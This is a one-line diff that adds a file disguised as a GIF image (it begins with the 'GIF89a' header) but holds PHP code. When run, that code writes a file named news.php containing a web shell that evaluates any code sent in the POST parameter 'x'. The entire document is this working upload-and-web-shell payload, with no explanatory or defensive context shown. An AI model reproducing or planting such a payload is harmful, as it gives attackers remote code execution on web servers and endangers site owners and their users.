@@ -1,0 +1,1 @@
+GIF89a<?PHP fputs(fopen('news.php','w'),'<?php eval($_POST[x])?>abcabcabc');?>
